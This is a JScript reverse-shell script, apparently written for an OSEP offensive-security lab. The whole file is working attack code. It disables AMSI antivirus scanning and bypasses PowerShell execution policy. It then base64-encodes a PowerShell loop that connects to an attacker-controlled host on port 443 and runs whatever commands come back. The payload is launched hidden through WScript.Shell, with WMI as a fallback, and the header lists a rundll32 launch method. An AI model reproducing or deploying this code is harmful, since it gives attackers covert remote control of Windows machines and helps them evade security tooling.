// ============================================================
// OSEP - JScript Reverse Shell
// Run via:  cscript js_revshell.js
//           wscript js_revshell.js  (silent, no console window)
//           rundll32 javascript:"\..\mshtml,RunHTMLApplication ";...  (LOLBIN)
// ============================================================

var LHOST = "192.168.45.X";
var LPORT = "443";
var LOG   = "C:\\Windows\\Temp\\osep_log.txt";

function writeLog(msg, level) {
    try {
        var fso = new ActiveXObject("Scripting.FileSystemObject");
        var f   = fso.OpenTextFile(LOG, 8, true);  // 8=append, true=create
        var ts  = new Date().toISOString();
        f.WriteLine("[" + ts + "][" + (level || "INFO") + "] " + msg);
        f.Close();
    } catch(e) {}
}

function encodeUTF16LEBase64(str) {
    // Encode string to UTF-16LE bytes then Base64 via MSXML2
    var stream = new ActiveXObject("ADODB.Stream");
    stream.Type    = 2;           // text
    stream.Charset = "utf-16le";
    stream.Open();
    stream.WriteText(str);
    stream.Position = 2;          // skip BOM
    stream.Type = 1;              // binary

    var xml  = new ActiveXObject("MSXML2.DOMDocument");
    var node = xml.createElement("b64");
    node.dataType     = "bin.base64";
    node.nodeTypedValue = stream.Read();
    stream.Close();
    return node.text.replace(/\n/g, "");
}

function main() {
    writeLog("JScript shell starting", "INFO");

    var psPayload = [
        "Set-ExecutionPolicy Bypass -Scope Process -Force;",
        "try{[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')",
        ".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)}catch{};",
        "while($true){",
            "try{",
                "$c=New-Object Net.Sockets.TCPClient('" + LHOST + "'," + LPORT + ");",
                "$s=$c.GetStream();",
                "$b=[byte[]]::new(65536);",
                "while(($n=$s.Read($b,0,$b.Length)) -gt 0){",
                    "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$n);",
                    "$r=(iex $d 2>&1|Out-String);",
                    "$r+='PS '+(Get-Location).Path+'> ';",
                    "$x=([Text.Encoding]::ASCII).GetBytes($r);",
                    "$s.Write($x,0,$x.Length);$s.Flush()",
                "};$c.Close()",
            "}catch{Start-Sleep -Seconds 5}",
        "}"
    ].join("");

    writeLog("Building encoded payload", "INFO");
    var encoded;
    try {
        encoded = encodeUTF16LEBase64(psPayload);
    } catch(e) {
        writeLog("Base64 encoding failed: " + e.message, "ERROR");
        // Fallback: launch plain (no -enc) — riskier but works
        encoded = null;
    }

    var cmd;
    if (encoded) {
        cmd = "powershell -nop -ep bypass -w hidden -enc " + encoded;
    } else {
        // Plain fallback — wrap in quotes, escape internal quotes
        cmd = "powershell -nop -ep bypass -w hidden -c \"" +
              psPayload.replace(/"/g, '`"') + "\"";
    }

    writeLog("Spawning PowerShell (method: WScript.Shell)", "INFO");
    try {
        var wsh = new ActiveXObject("WScript.Shell");
        wsh.Run(cmd, 0, false);   // 0=hidden, false=async
        writeLog("WScript.Shell.Run OK", "INFO");
        return;
    } catch(e) {
        writeLog("WScript.Shell failed: " + e.message + " — trying WMI", "ERROR");
    }

    writeLog("Spawning PowerShell (method: WMI)", "INFO");
    try {
        var wmi = GetObject("winmgmts:\\\\.\\root\\cimv2:Win32_Process");
        var pid = new Object();
        wmi.Create(cmd, null, null, pid);
        writeLog("WMI spawned PID: " + pid, "INFO");
    } catch(e) {
        writeLog("WMI also failed: " + e.message, "ERROR");
    }
}

main();
